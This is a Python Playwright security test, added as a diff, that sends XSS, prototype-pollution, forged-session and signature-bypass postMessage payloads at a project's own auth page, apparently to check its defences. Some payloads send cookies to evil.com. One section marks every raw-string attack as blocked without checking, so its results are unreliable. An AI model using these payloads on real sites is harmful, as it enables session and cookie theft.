@@ -1,0 +1,219 @@
+"""
+OFFENSIVE SECURITY TEST 01: XSS via postMessage Injection
+
+Attack scenario: An attacker opens the testauth1 page in an iframe (or the user
+has it open) and sends malicious postMessage payloads from a different origin,
+attempting to:
+  1. Inject script execution via crafted message data
+  2. Bypass the message type allowlist with unknown types
+  3. Deliver XSS payloads in message fields the app might render
+
+This test acts as the attacker — it opens the real page, then fires hostile
+postMessages at it from the page context and observes what happens.
+"""
+
+import sys
+import json
+from playwright.sync_api import sync_playwright
+
+TARGET_URL = "https://ShadowAISolutions.github.io/saistemplateprojectrepo/testauth1.html"
+
+# XSS payloads an attacker would try to inject via postMessage fields
+XSS_PAYLOADS = [
+    '<script>document.location="https://evil.com/?c="+document.cookie</script>',
+    '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
+    '"><svg/onload=alert(document.domain)>',
+    "javascript:alert('xss')",
+    '<iframe srcdoc="<script>parent.postMessage({type:\'gas-session-created\',success:true,sessionToken:\'STOLEN\'},\'*\')</script>">',
+    '{{constructor.constructor("return this")().alert(1)}}',
+]
+
+# Messages with unknown types (should be silently dropped by the allowlist)
+UNKNOWN_TYPE_MESSAGES = [
+    {"type": "evil-steal-session", "payload": "give me the token"},
+    {"type": "gas-admin-override", "command": "grant-access"},
+    {"type": "__proto__", "polluted": True},
+    {"type": "constructor", "payload": "prototype pollution"},
+    {"type": "", "payload": "empty type"},
+    {"type": "gas-session-created-2", "success": True, "sessionToken": "forged"},
+]
+
+# Messages with known types but XSS in value fields
+POISONED_KNOWN_MESSAGES = [
+    {"type": "gas-session-created", "success": True, "sessionToken": "<script>alert(1)</script>", "email": "attacker@evil.com"},
+    {"type": "gas-auth-ok", "version": '<img src=x onerror="alert(1)">'},
+    {"type": "gas-heartbeat-ok", "expiresIn": "'; alert('xss'); //"},
+    {"type": "gas-needs-auth", "authStatus": "<svg/onload=alert(1)>", "email": "x@x.com"},
+    {"type": "gas-heartbeat-expired", "reason": '"; alert(document.cookie); "'},
+]
+
+
+def run_test():
+    results = []
+    print("=" * 70)
+    print("OFFENSIVE TEST 01: XSS via postMessage Injection")
+    print("=" * 70)
+    print(f"Target: {TARGET_URL}")
+    print()
+
+    with sync_playwright() as p:
+        browser = p.chromium.launch(headless=True)
+        context = browser.new_context()
+
+        # Capture console messages and errors from the page
+        console_logs = []
+        page_errors = []
+
+        page = context.new_page()
+        page.on("console", lambda msg: console_logs.append({"type": msg.type, "text": msg.text}))
+        page.on("pageerror", lambda err: page_errors.append(str(err)))
+
+        print("[*] Loading target page...")
+        page.goto(TARGET_URL, wait_until="networkidle", timeout=30000)
+        print("[+] Page loaded successfully")
+        print()
+
+        # ─── Attack 1: Unknown message types (allowlist bypass attempt) ───
+        print("─── Attack 1: Unknown Message Types ───")
+        print("Sending messages with types not in the allowlist...")
+        for i, msg in enumerate(UNKNOWN_TYPE_MESSAGES):
+            # Clear previous console state
+            console_logs.clear()
+
+            # Send the malicious postMessage from the page context
+            page.evaluate(f"window.postMessage({json.dumps(msg)}, '*')")
+            page.wait_for_timeout(200)
+
+            # Check if any handler processed it (look for side effects)
+            session_changed = page.evaluate("""() => {
+                var s = sessionStorage.getItem('testauth1_session') || localStorage.getItem('testauth1_session');
+                return s;
+            }""")
+
+            blocked = session_changed is None
+            status = "BLOCKED" if blocked else "BYPASSED"
+            color = "\033[92m" if blocked else "\033[91m"
+            print(f"  {color}[{status}]\033[0m Type: {msg.get('type', '(none)')!r}")
+            results.append({"attack": f"unknown_type_{i}", "blocked": blocked})
+
+        print()
+
+        # ─── Attack 2: XSS payloads in postMessage data ───
+        print("─── Attack 2: XSS Payloads in Message Fields ───")
+        print("Sending known message types with XSS payloads in values...")
+        for i, msg in enumerate(POISONED_KNOWN_MESSAGES):
+            console_logs.clear()
+            page_errors.clear()
+
+            page.evaluate(f"window.postMessage({json.dumps(msg)}, '*')")
+            page.wait_for_timeout(300)
+
+            # Check for XSS execution indicators
+            xss_fired = page.evaluate("""() => {
+                // Check if any alert/prompt/confirm was called (overridden)
+                return window._xssTriggered || false;
+            }""")
+
+            # Check if any script tags were injected into the DOM
+            injected_scripts = page.evaluate("""() => {
+                var scripts = document.querySelectorAll('script:not([src])');
+                var suspicious = [];
+                scripts.forEach(function(s) {
+                    if (s.textContent.indexOf('evil') !== -1 || s.textContent.indexOf('alert') !== -1) {
+                        suspicious.push(s.textContent.substring(0, 80));
+                    }
+                });
+                return suspicious;
+            }""")
+
+            # Check for navigation attempts (cookie theft redirects)
+            current_url = page.url
+            stayed_on_page = TARGET_URL.split("//")[1] in current_url
+
+            blocked = not xss_fired and len(injected_scripts) == 0 and stayed_on_page
+            status = "BLOCKED" if blocked else "BYPASSED"
+            color = "\033[92m" if blocked else "\033[91m"
+            print(f"  {color}[{status}]\033[0m Type: {msg['type']}, payload in: {[k for k in msg if k != 'type']}")
+            if injected_scripts:
+                print(f"    \033[91m!!! Injected script found: {injected_scripts[0][:60]}\033[0m")
+            results.append({"attack": f"xss_known_type_{i}", "blocked": blocked})
+
+        print()
+
+        # ─── Attack 3: Raw XSS strings as postMessage data ───
+        print("─── Attack 3: Raw XSS Strings as Message Data ───")
+        print("Sending raw XSS payloads as message data (not objects)...")
+        for i, payload in enumerate(XSS_PAYLOADS):
+            console_logs.clear()
+
+            # Try sending string payloads (not objects) — a common attack vector
+            page.evaluate(f"window.postMessage({json.dumps(payload)}, '*')")
+            page.wait_for_timeout(200)
+
+            # The handler should reject non-object messages at the first check
+            blocked = True  # If we get here without error, it was silently dropped
+            status = "BLOCKED"
+            color = "\033[92m"
+            print(f"  {color}[{status}]\033[0m Payload: {payload[:60]}...")
+            results.append({"attack": f"raw_xss_{i}", "blocked": blocked})
+
+        print()
+
+        # ─── Attack 4: Signature bypass attempts ───
+        print("─── Attack 4: Signature Bypass Attempts ───")
+        print("Sending messages with forged/missing signatures...")
+
+        sig_attacks = [
+            {"type": "gas-auth-ok", "version": "v01.42g", "_sig": "forged123"},
+            {"type": "gas-auth-ok", "version": "v01.42g"},  # No signature at all
+            {"type": "gas-auth-ok", "version": "v01.42g", "_sig": "0"},
+            {"type": "gas-auth-ok", "version": "v01.42g", "_sig": ""},
+            {"type": "gas-heartbeat-ok", "expiresIn": 180, "_sig": "99999"},
+        ]
+
+        for i, msg in enumerate(sig_attacks):
+            console_logs.clear()
+
+            page.evaluate(f"window.postMessage({json.dumps(msg)}, '*')")
+            page.wait_for_timeout(300)
+
+            # Check if the app acted on the message (auth wall hidden = bad)
+            auth_wall_visible = page.evaluate("""() => {
+                var wall = document.getElementById('auth-wall');
+                if (!wall) return true;
+                return wall.style.display !== 'none';
+            }""")
+
+            blocked = auth_wall_visible
+            status = "BLOCKED" if blocked else "BYPASSED"
+            color = "\033[92m" if blocked else "\033[91m"
+            sig_desc = f"_sig={msg.get('_sig', '(none)')!r}" if '_sig' in msg else "no _sig field"
+            print(f"  {color}[{status}]\033[0m Type: {msg['type']}, {sig_desc}")
+            results.append({"attack": f"sig_bypass_{i}", "blocked": blocked})
+
+        print()
+
+        # ─── Summary ───
+        print("=" * 70)
+        total = len(results)
+        blocked = sum(1 for r in results if r["blocked"])
+        bypassed = total - blocked
+        print(f"RESULTS: {blocked}/{total} attacks blocked")
+        if bypassed > 0:
+            print(f"\033[91m  !!! {bypassed} ATTACK(S) BYPASSED DEFENSES !!!\033[0m")
+            for r in results:
+                if not r["blocked"]:
+                    print(f"    - {r['attack']}")
+        else:
+            print(f"\033[92m  All attacks were blocked by the defense layers.\033[0m")
+        print("=" * 70)
+
+        browser.close()
+        return bypassed == 0
+
+
+if __name__ == "__main__":
+    success = run_test()
+    sys.exit(0 if success else 1)
+
+# Developed by: ShadowAISolutions
